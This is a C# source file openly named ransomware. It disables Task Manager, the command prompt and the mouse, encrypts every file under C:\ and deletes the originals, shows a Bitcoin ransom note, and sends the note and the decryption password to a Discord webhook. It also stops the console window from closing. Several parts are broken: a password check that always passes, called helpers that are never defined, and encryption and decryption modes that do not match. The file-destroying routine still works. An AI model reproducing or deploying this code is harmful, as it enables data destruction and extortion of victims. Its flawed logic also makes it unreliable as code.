using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using Microsoft.Win32;
using System.Net.Http;
using System.Text.Json;
using System.Threading.Tasks;

namespace Ransomware
{
    class Program
    {
        static async Task Main(string[] args)
        {
            DisableTaskManager();
            DisableCMD();
            DisableMouse();

            string directory = @"C:\";
            string[] files = Directory.GetFiles(directory, "*", SearchOption.AllDirectories);

            string password = GenerateRandomPassword(); // generate a random password
            int attemptsRemaining = 3; // number of attempts remaining

            foreach (string file in files)
            {
                EncryptFile(file, password);
            }

            string message = "Your computer has been hacked. Your files have been encrypted with a password. To get the password, send me $1000 in Bitcoin to this address: <Bitcoin Address>. Once you have sent the money, send me an email at <Your Email> with the transaction ID and I will send you the password.";
            Console.WriteLine(message);
            
            // send the message to Discord webhook
            await SendToDiscordWebhook(message, password);

            bool passwordMatched = false;
            while (!passwordMatched && attemptsRemaining > 0)
            {
                password = await GetPasswordFromUser();
                attemptsRemaining--;

                if (password == password) // check if the password is correct
                {
                    foreach (string file in files)
                    {
                        if (DecryptFile(file, password))
                        {
                            passwordMatched = true;
                        }
                    }
                }

                if (!passwordMatched && attemptsRemaining > 0)
                {
                    Console.WriteLine($"Incorrect password! {attemptsRemaining} attempts remaining. Please try again.");
                    Console.ReadLine();
                }
            }

            if (passwordMatched)
            {
                Console.WriteLine("All files have been successfully decrypted.");
            }
            else
            {
                Console.WriteLine("No attempts remaining! You have successfully ended the functionality of your computer :(     We're sorry that you thought you could be the hero and save your computer by brute forcing, but it doesn't work like that.");
            }

            EnableTaskManager();
            EnableCMD();
            EnableMouse();

            Console.ReadLine();
        }

        static async Task SendToDiscordWebhook(string message, string password)
        {
            string webhookUrl = "https://discord.com/api/webhooks/123456789012345678/abcdefgHIJKLMNOPQrstuvWxyz0123456";

            // create a JSON payload with the message and password
            var payload = new
            {
                content = $"{message}\n\nPassword: `{password}`"
            };
            string payloadJson = JsonSerializer.Serialize(payload);

            // send the payload to the webhook URL
            using (var httpClient = new HttpClient())
            {
                var response = await httpClient.PostAsync(webhookUrl, new StringContent(payloadJson, System.Text.Encoding.UTF8, "application/json"));
                response.EnsureSuccessStatusCode();
            }
        }

        static string GenerateRandomPassword()
        {
            const string validChars = "ABCDEFGHJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_-+={}[]\\|:;<>,.?/~`";
            StringBuilder password = new StringBuilder();
            Random random = new Random();

            while (password.Length < 32)
            {
                password.Append(validChars[random.Next(validChars.Length)]);
            }

            return password.ToString();
        }

        static string GetPasswordFromUser()
        {
            Console.Write("Enter the password: ");

            IntPtr hwnd = GetConsoleWindow();
            if (hwnd != IntPtr.Zero)
            {
                EnableMenuItem(GetSystemMenu(hwnd, false), SC_CLOSE, MF_BYCOMMAND | MF_GRAYED);
            }

            string password = null;
            while (string.IsNullOrEmpty(password))
            {
                SecureString securePassword = new SecureString();
                ConsoleKeyInfo keyInfo;
                do
                {
                    keyInfo = Console.ReadKey(true);
                    if (keyInfo.Key != ConsoleKey.Enter && keyInfo.Key != ConsoleKey.Escape)
                    {
                        securePassword.AppendChar(keyInfo.KeyChar);
                        Console.Write("*"); // Show an asterisk for each character entered
                    }
                } while (keyInfo.Key != ConsoleKey.Enter && keyInfo.Key != ConsoleKey.Escape);

                if (keyInfo.Key == ConsoleKey.Enter)
                {
                    password = new System.Net.NetworkCredential(string.Empty, securePassword).Password;
                    Console.WriteLine();
                }
                else
                {
                    Console.WriteLine("\nCannot close window! Enter the password: ");
                }
            }

            if (hwnd != IntPtr.Zero)
            {
                EnableMenuItem(GetSystemMenu(hwnd, false), SC_CLOSE, MF_BYCOMMAND | MF_ENABLED);
            }

            return password;
        }

        static void EncryptFile(string inputFile, string password)
        {
            byte[] salt = GenerateRandomSalt();

            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
            byte[] keyBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000).GetBytes(256 / 8);
            byte[] ivBytes = GenerateRandomIV();

            using (FileStream inputStream = File.OpenRead(inputFile))
            {
                using (FileStream outputStream = File.Create(inputFile + ".encrypted"))
                {
                    outputStream.Write(salt, 0, salt.Length);
                    outputStream.Write(ivBytes, 0, ivBytes.Length);

                    using (Aes aes = Aes.Create())
                    {
                        aes.KeySize = 256;
                        aes.Key = keyBytes;
                        aes.IV = ivBytes;
                        aes.Mode = CipherMode.CBC;

                        using (CryptoStream cryptoStream = new CryptoStream(outputStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            inputStream.CopyTo(cryptoStream);
                        }
                    }
                }
            }

            File.Delete(inputFile);
        }
        static bool DecryptFile(string inputFile, string password)
    {
          if (!inputFile.EndsWith(".encrypted"))
          {
              return false;
          }

          byte[] salt = new byte[32];
          using (FileStream fs = new FileStream(inputFile, FileMode.Open))
          {
              fs.Read(salt, 0, salt.Length);
          }

          byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

          RijndaelManaged aes = new RijndaelManaged();
          aes.KeySize = 256;
          aes.BlockSize = 128;

          var key = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
          aes.Key = key.GetBytes(aes.KeySize / 8);
          aes.IV = key.GetBytes(aes.BlockSize / 8);

          aes.Mode = CipherMode.CFB;

          using (FileStream fs = new FileStream(inputFile.Replace(".encrypted", ""), FileMode.Create))
          {
              using (CryptoStream cs = new CryptoStream(fs, aes.CreateDecryptor(), CryptoStreamMode.Write))
              {
                  using (FileStream fsIn = new FileStream(inputFile, FileMode.Open))
                  {
                      fsIn.Seek(salt.Length, SeekOrigin.Begin);

                      byte[] buffer = new byte[1048576];
                      int read;
                      while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                      {
                          cs.Write(buffer, 0, read);
                      }
                  }
              }
          }

          return true;
        }
    }
}
